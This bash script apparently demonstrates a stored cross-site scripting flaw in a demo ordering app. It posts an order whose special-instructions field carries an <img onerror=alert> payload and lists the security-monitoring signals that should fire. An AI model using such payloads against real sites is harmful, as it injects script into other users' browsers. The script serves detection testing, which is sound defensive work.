#!/usr/bin/env bash
# Demo: Stored XSS via order special instructions
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/_common.sh"

banner "Stored XSS" \
       "corndog-web-ui (Angular) + corndog-orders (Flask)" \
       "IAST Vulnerability Detection"

run_curl "Placing order with XSS payload in specialInstructions" \
  -X POST "${BASE_URL}/api/orders" \
  -H "Content-Type: application/json" \
  -d '{
    "customerName": "XSS Demo",
    "items": [{"menu_item_id": 1, "quantity": 1}],
    "specialInstructions": "<img src=x onerror=alert('"'"'XSS'"'"')>",
    "totalPrice": 4.99
  }'

echo -e "${YLW}  Tip: Open the order confirmation or admin panel in a browser${RST}"
echo -e "${YLW}  to see the XSS payload render.${RST}"
echo ""

dd_signal \
  "Security > Application Security > Vulnerabilities — IAST XSS finding" \
  "RUM > Sessions — browser error from onerror handler" \
  "Admin panel or confirmation page renders the injected <img> tag"
